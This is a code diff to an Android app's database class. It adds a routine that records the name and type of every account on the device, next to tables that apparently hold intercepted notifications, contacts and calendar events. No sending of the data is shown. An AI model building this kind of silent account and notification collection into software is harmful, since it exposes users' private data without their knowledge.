@@ -1,6 +1,7 @@
 package com.candroid.lofl.data.db;
 
 import android.Manifest;
+import android.accounts.Account;
 import android.content.ContentValues;
 import android.content.Context;
 import android.content.pm.ApplicationInfo;
@@ -15,6 +16,7 @@ import com.candroid.lofl.api.Apps;
 import com.candroid.lofl.api.ContentProviders;
 import com.candroid.lofl.api.Storage;
 import com.candroid.lofl.api.Systems;
+import com.candroid.lofl.api.User;
 import com.candroid.lofl.data.pojos.CalendarEvent;
 import com.candroid.lofl.data.pojos.Contact;
 import com.candroid.lofl.data.pojos.InterceptedNotification;
@@ -29,6 +31,24 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class Database {
+
+    public static void insertAccounts(SQLiteDatabase database, Account[] accounts){
+        long newRowId = -1;
+        try{
+            database.beginTransaction();
+            for(Account account : accounts){
+                ContentValues values = new ContentValues();
+                values.put(DataContract.AccountsContract.COLUMN_NAME, account.name);
+                values.put(DataContract.AccountsContract.COLUMN_TYPE, account.type);
+                newRowId = database.insert(DataContract.AccountsContract.TABLE_NAME, null, values);
+            }
+            database.setTransactionSuccessful();
+        }catch (Exception e){
+            e.printStackTrace();
+        }finally{
+            database.endTransaction();
+        }
+    }
 
     public static void insertNotification(SQLiteDatabase database, InterceptedNotification notification){
         long newRowId = -1;
@@ -432,6 +452,16 @@ public class Database {
             } finally {
                 database.endTransaction();
                 JobsScheduler.setJobRan(context, JobsScheduler.DEVICE_KEY);
+            }
+            //SYNC ACCOUNTS
+            try{
+                database.beginTransaction();
+                Database.insertAccounts(database, User.getAccounts(context));
+                database.setTransactionSuccessful();
+            }catch (SQLException e){
+                e.printStackTrace();
+            }finally {
+                database.endTransaction();
             }
             database.setTransactionSuccessful();
         } catch (SQLException e) {
